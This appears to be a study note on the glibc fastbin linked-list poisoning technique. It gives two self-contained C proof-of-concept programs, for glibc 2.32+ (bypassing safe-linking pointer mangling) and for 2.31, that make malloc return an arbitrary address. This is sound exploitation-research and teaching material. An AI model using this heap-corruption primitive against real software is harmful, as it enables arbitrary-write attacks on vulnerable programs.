<details>
<summary><strong>Description</strong></summary>
<p>

this is going to be extremely similar to the tcache linked list process, and with the same end result. Due to a few differences, this isn't going to be as practical and useful as the tcache linked list technique...

however, it used to be a lot more useful...

</p>
</details>

<details>
<summary><strong>Ref</strong></summary>
<p>

- https://github.com/guyinatuxedo/Shogun/blob/main/pwn_demos/fastbin/fastbin_linked/readme.md

</p>
</details>

### For `2.32+` versions

<details>
<summary><strong>POC</strong></summary>
<p>

> compiled with glibc `2.35`, `2.38` and `2.39`

```c
#include <stdio.h>
#include <stdlib.h>

void main() {
    setbuf(stdin, NULL); // disable buffering so _IO_FILE does not interfere with our heap
    setbuf(stdout, NULL);

    long *chunk[8], *target, x[0x30], *reallocate_chunk;

    for(int i = 0; i < 8; i++) chunk[i] = malloc(0x78); // request size must be in fastbin range in order to work

    for(int i = 0; i < 7; i++) free(chunk[i]); // fill the 0x80 tcache
    free(chunk[7]); // chunk[7] goes to 0x80 fastbin

     // target must be aligned 0x10 (explain later)
    for(int i = 0x10; i < 0x20; i++) {
        if((((long)&x[i]) & 0xF) == 0) {
            target = &x[i];
            break;
        }
    }

    target[-1] = 0x81; // set up fake fastbin chunk size fit with the 0x80 fastbin (this is needed to bypass mitigation)
    target[0] = 0 ^ (((long)target - 0x10) >> 12); // set up fake fastbin chunk's next ptr is NULL to prevent error while dumping (can bypass this by other ways)

    printf("target: %p\n", target);

    /*VULNERABILITY*/
    chunk[7][0] = ((long)target - 0x10) ^ (((long)chunk[7] - 0x10) >> 12); // set up next ptr of 0x80 fastbin head point to target
    /*VULNERABILITY*/
    
    for(int i = 0; i < 7; i++) malloc(0x78); // empty the tcache
    malloc(0x78); // allocate a chunk from 0x80 fastbin, trigger fastbin dumping, now target is in 0x80 tcache
    // [tcache 0x80]: target
    // that's why target must be alligned 0x10

    reallocate_chunk = malloc(0x78);

    printf("reallocate chunk: %p\n", reallocate_chunk);
}
```

</p>
</details>

<details>
<summary><strong>Comment</strong></summary>
<p>

the fastbin itself doesnt have address aligned `0x10` check, but we need to prepare fake chunk size and aligned address to prevent error when the fastbin tcache dumping occur...

</p>
</details>

### For `2.31` version

<details>
<summary><strong>POC</strong></summary>
<p>

> compiled with glibc `2.31`

```c
#include <stdio.h>
#include <stdlib.h>

void main() {
    setbuf(stdin, NULL); // disable buffering so _IO_FILE does not interfere with our heap
    setbuf(stdout, NULL);

    long *chunk[8], *target, x[0x30], *reallocate_chunk;

    for(int i = 0; i < 8; i++) chunk[i] = malloc(0x78); // request size must be in fastbin range in order to work

    for(int i = 0; i < 7; i++) free(chunk[i]); // fill the 0x80 tcache
    free(chunk[7]); // chunk[7] goes to 0x80 fastbin

    // target doesnt need to aligned 0x10 in 2.31
    target = (char *)(&x[0x20]) - 2;

    target[-1] = 0x81; // set up fake fastbin chunk size fit with the 0x80 fastbin (this is needed to bypass mitigation)
    target[0] = 0; // set up fake fastbin chunk's next ptr is NULL to prevent error while dumping (can bypass this by other ways)

    printf("target: %p\n", target);

    /*VULNERABILITY*/
    chunk[7][0] = ((long)target - 0x10); // set up next ptr of 0x80 fastbin head point to target
                                         // no mangled pointer in glibc 2.31
    /*VULNERABILITY*/
    
    for(int i = 0; i < 7; i++) malloc(0x78); // empty the tcache
    malloc(0x78); // allocate a chunk from 0x80 fastbin, trigger fastbin dumping, now target is in 0x80 tcache
    // [tcache 0x80]: target

    reallocate_chunk = malloc(0x78);

    printf("reallocate chunk: %p\n", reallocate_chunk);
}
```

</p>
</details>